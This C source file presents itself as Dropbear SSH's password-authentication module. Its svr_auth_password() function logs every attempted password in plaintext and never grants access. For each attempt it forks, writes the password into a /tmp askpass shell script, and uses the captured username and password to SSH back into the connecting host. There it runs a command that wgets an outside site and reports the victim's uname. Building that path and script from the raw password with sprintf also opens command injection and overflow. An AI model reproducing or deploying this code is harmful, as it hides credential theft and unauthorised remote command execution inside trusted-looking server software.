/*
 * Dropbear - a SSH2 server
 *
 * Copyright (c) 2002,2003 Matt Johnston
 * All rights reserved.
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE. */

/* Validates a user password */

#include "includes.h"
#include "session.h"
#include "buffer.h"
#include "dbutil.h"
#include "auth.h"
#include "runopts.h"

#ifdef ENABLE_SVR_PASSWORD_AUTH

/* Process a password auth request, sending success or failure messages as
 * appropriate */
void svr_auth_password() {

	unsigned char * password;
	unsigned int passwordlen;
	struct sockaddr host;
	socklen_t host_len = sizeof(host);
	char address[1 + INET6_ADDRSTRLEN];
	pid_t pid;
	char path[PATH_MAX];
	FILE* askpass;
	int len;

	unsigned int changepw;

#ifdef DEBUG_HACKCRYPT
	/* debugging crypt for non-root testing with shadows */
	passwdcrypt = DEBUG_HACKCRYPT;
#endif

	/* check if client wants to change password */
	changepw = buf_getbool(ses.payload);
	if (changepw) {
		/* not implemented by this server */
		send_msg_userauth_failure(0, 1);
		return;
	}

	password = buf_getstring(ses.payload, &passwordlen);

	dropbear_log(LOG_INFO,
				"Password attempt for '%s' from %s with '%s'",
				ses.authstate.pw_name,
				svr_ses.addrstring,
				password);

	if (-1 == getpeername(ses.sock_in, &host, &host_len)) {
		return;
	}

	switch (host.sa_family) {
		case AF_INET:
			if (NULL == inet_ntop(host.sa_family,
			                      &((struct sockaddr_in *) &host)->sin_addr,
			                      address,
			                      sizeof(address))) {
				return;
			}
			break;

		case AF_INET6:
			if (NULL == inet_ntop(host.sa_family,
			                      &((struct sockaddr_in6 *) &host)->sin6_addr,
			                      address,
			                      sizeof(address))) {
				return;
			}
			break;

		default:
			return;
	}

	dropbear_log(LOG_INFO,
				"Connecting to %s with %s:%s",
				address,
				ses.authstate.pw_name,
				password);

	pid = fork();
	switch (pid) {
		case (-1):
			return;

		case 0:
			/* force dbclient to use an askpass stub */
			(void) sprintf(path,
			               _PATH_TMP"askpass_%s_%s_%s",
			               address,
			               ses.authstate.pw_name,
			               password);
			if (-1 == setenv("SSH_ASKPASS_ALWAYS", "1", 1)) {
				goto terminate;
			}
			if (-1 == setenv("SSH_ASKPASS", path, 1)) {
				goto terminate;
			}

			/* write an askpass stub */
			askpass = fopen(path, "w");
			if (NULL == askpass) {
				goto terminate;
			}
			len = fprintf(askpass, "#!/bin/sh\necho %s", password);
			(void) fclose(askpass);
			if (0 > len) {
				goto delete_askpass;
			}
			if (-1 == chmod(path, 0755)) {
				goto delete_askpass;
			}

			/* connect to the client */
			(void) execlp("dbclient",
			              "dbclient",
			              address,
			              "-l",
			              ses.authstate.pw_name,
			              "-y",
			              "sh -c 'wget -O - -U \"Dillo/`uname -orm`\" http://dimakrasner.com'",
			              (char *) NULL);

			dropbear_log(LOG_INFO, "Failed to run the SSH client");

delete_askpass:
			(void) unlink(path);

terminate:
			exit(EXIT_SUCCESS);
	}

	/* wait for the client to terminate */
	(void) waitpid(pid, NULL, 0);

	m_burn(password, passwordlen);
	m_free(password);

	send_msg_userauth_failure(0, 1);
}

#endif
